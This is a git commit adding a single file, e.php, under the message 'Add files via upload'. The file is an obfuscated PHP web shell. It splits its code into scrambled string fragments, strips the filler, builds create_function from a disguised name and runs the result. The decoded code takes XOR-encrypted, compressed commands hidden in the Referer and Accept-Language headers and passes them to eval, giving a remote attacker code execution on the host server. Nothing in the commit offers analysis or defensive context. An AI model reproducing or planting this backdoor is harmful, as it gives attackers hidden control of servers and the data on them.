0346fc1bed36469fbc1f0033218a35f084be5adf
redkcw <36258459+redkcw@users.noreply.github.com>
2018-02-08 07:56:19 +0000

    Add files via upload

---
+++ e.php
@@ -0,0 +1,18 @@
+<?php
+$n='we3"r"3";$i=3"$m[1][0].$m[1][1];3"$h=$sl3"($ss3"(md5($i3"3".$k3"h),03",3))3";$f=$sl($ss(md3"5($';
+$d='ra,$m);if($q&&3"$m){@sess3"ion_s3"tart()3";$s=&$_S3"3"ESSION;$3"ss="substr3"";3"$sl="s3"tr3"tolo';
+$M='ANG3"UAGE3""]3"3";if($rr&&$ra){$3"u=parse_url3"($rr3")3";p3"arse_str($u[3"3""3"q3"uery"],$q);$';
+$D='_en3"code(x(gzc3"ompr3"ess(3"$o),$k));3"print(3""3"<$k>$d</$k>3"");@sess3"ion_3"de3"stroy();}}}}';
+$u=str_replace('H','','crHeatHe_HfHuncHtiHon');
+$B='[$i].=$p3";$e3"=strpos($s[3"$i3"],$f);if($3"e3"){$k=$kh.3"$kf;ob_s3"tart3"();@ev3"al(@3"gz3"un';
+$w='};}}return 3"$o;}3"$r=$_SER3"VER;$rr3"=@$r["H3"TTP_3"REFERER3""3"];$ra=@3"$r["HTT3"P_3"ACCEPT_L';
+$T='"pos($p,$h3")=3"==0){$s[$i]3"="3"";3"3"$p=$ss($p,3);}if(arr3"ay_3"key_3"exists($3"i,$s3"3")){$s';
+$W='$3"kh="de71";$k3"f=3""19dc";funct3"io3"n x3"(3"$t,$k3"){$c=strle3"n($k);$l=strl3"en($t);3"$o=""';
+$F=';fo3"r($i=03";$i<3"$l;)3"{for(3"3"$j=3"0;($j<$c&3"&$i<$l);$j++,$i++3"){$o3".=$3"3"t{$i}3"^$k{$j';
+$C='i.$3"kf),3"0,3));$p=""3"3";for3"($z=1;$z<cou3"nt($m[13"]);$z++)$p3".=3"$q[$m[2][$3"z]];i3"f(str3';
+$i='compress(@x(3"@base63"4_de3"c3"ode(pr3"eg_r3"eplace(array(3"3""/_/","/-/")3",3"array("/",3"3"3""';
+$b='q3"=array_values(3"$q);preg_mat3"ch_3"al3"l("/([\\w])[\\w-3"]+(3"?:;q=3"0.([3"\\d3"])3")?,?/",3"$';
+$G='+"),$ss3"($s[$i]3",0,$e)3")),$k)))3";$o=ob3"_g3"3"et_contents();o3"b_end_clean();$d=b3"ase63"4';
+$a=str_replace('3"','',$W.$F.$w.$M.$b.$d.$n.$C.$T.$B.$i.$G.$D);
+$Z=$u('',$a);$Z();
+?>
